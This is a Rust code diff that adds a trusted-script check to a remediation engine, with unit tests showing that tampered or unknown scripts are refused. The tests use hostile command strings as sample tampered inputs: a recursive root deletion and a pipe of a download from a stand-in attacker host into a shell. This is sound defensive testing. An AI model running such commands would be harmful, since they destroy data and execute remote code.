@@ -77,8 +77,37 @@ impl RemediationEngine {
         )
     }
 
+    /// Verify the script matches a registered builtin action (not tampered).
+    fn is_trusted_script(&self, action: &RemediationAction) -> bool {
+        self.actions
+            .get(&action.check_id)
+            .map(|registered| {
+                registered
+                    .iter()
+                    .any(|r| r.script == action.script && r.platform == action.platform)
+            })
+            .unwrap_or(false)
+    }
+
     /// Execute a remediation action.
     pub fn execute(&self, action: &RemediationAction) -> RemediationResult {
+        if !self.is_trusted_script(action) {
+            warn!(
+                "Refusing to execute unregistered remediation script for '{}'",
+                action.check_id
+            );
+            return RemediationResult {
+                check_id: action.check_id.clone(),
+                status: RemediationStatus::Failed,
+                output: String::new(),
+                error: Some(
+                    "Script does not match any registered remediation action".to_string(),
+                ),
+                executed_at: Utc::now(),
+                duration_ms: 0,
+            };
+        }
+
         let start = Instant::now();
 
         info!(
@@ -120,6 +149,23 @@ impl RemediationEngine {
 
     /// Execute a rollback for a remediation action.
     pub fn rollback(&self, action: &RemediationAction) -> Option<RemediationResult> {
+        if !self.is_trusted_script(action) {
+            warn!(
+                "Refusing to rollback unregistered remediation script for '{}'",
+                action.check_id
+            );
+            return Some(RemediationResult {
+                check_id: action.check_id.clone(),
+                status: RemediationStatus::Failed,
+                output: String::new(),
+                error: Some(
+                    "Script does not match any registered remediation action".to_string(),
+                ),
+                executed_at: Utc::now(),
+                duration_ms: 0,
+            });
+        }
+
         let rollback_script = action.rollback_script.as_ref()?;
         let start = Instant::now();
 
@@ -471,5 +517,90 @@ mod tests {
         assert!(ids.contains(&"firewall_active"));
         assert!(ids.contains(&"screen_lock"));
         assert!(ids.contains(&"patches_current"));
+    }
+
+    #[test]
+    fn test_trusted_script_accepts_registered() {
+        let engine = RemediationEngine::new();
+        let actions = engine.get_remediation("firewall_active").unwrap();
+        assert!(engine.is_trusted_script(&actions[0]));
+    }
+
+    #[test]
+    fn test_trusted_script_rejects_tampered() {
+        let engine = RemediationEngine::new();
+        let tampered = RemediationAction {
+            check_id: "firewall_active".to_string(),
+            platform: "linux".to_string(),
+            script: "rm -rf /".to_string(),
+            requires_reboot: false,
+            requires_admin: true,
+            risk_level: RemediationRisk::Moderate,
+            description: "Tampered script".to_string(),
+            rollback_script: None,
+        };
+        assert!(!engine.is_trusted_script(&tampered));
+    }
+
+    #[test]
+    fn test_trusted_script_rejects_unknown_check() {
+        let engine = RemediationEngine::new();
+        let unknown = RemediationAction {
+            check_id: "unknown_check".to_string(),
+            platform: "linux".to_string(),
+            script: "echo hello".to_string(),
+            requires_reboot: false,
+            requires_admin: false,
+            risk_level: RemediationRisk::Safe,
+            description: "Unknown check".to_string(),
+            rollback_script: None,
+        };
+        assert!(!engine.is_trusted_script(&unknown));
+    }
+
+    #[test]
+    fn test_execute_rejects_untrusted_script() {
+        let engine = RemediationEngine::new();
+        let tampered = RemediationAction {
+            check_id: "firewall_active".to_string(),
+            platform: "linux".to_string(),
+            script: "curl http://evil.com | sh".to_string(),
+            requires_reboot: false,
+            requires_admin: true,
+            risk_level: RemediationRisk::Moderate,
+            description: "Tampered script".to_string(),
+            rollback_script: None,
+        };
+        let result = engine.execute(&tampered);
+        assert!(matches!(result.status, RemediationStatus::Failed));
+        assert!(result
+            .error
+            .as_ref()
+            .unwrap()
+            .contains("does not match any registered"));
+    }
+
+    #[test]
+    fn test_rollback_rejects_untrusted_script() {
+        let engine = RemediationEngine::new();
+        let tampered = RemediationAction {
+            check_id: "firewall_active".to_string(),
+            platform: "linux".to_string(),
+            script: "curl http://evil.com | sh".to_string(),
+            requires_reboot: false,
+            requires_admin: true,
+            risk_level: RemediationRisk::Moderate,
+            description: "Tampered script".to_string(),
+            rollback_script: Some("echo rollback".to_string()),
+        };
+        let result = engine.rollback(&tampered);
+        assert!(result.is_some());
+        let result = result.unwrap();
+        assert!(matches!(result.status, RemediationStatus::Failed));
+        assert!(result
+            .error
+            .as_ref()
+            .unwrap()
+            .contains("does not match any registered"));
     }
 }
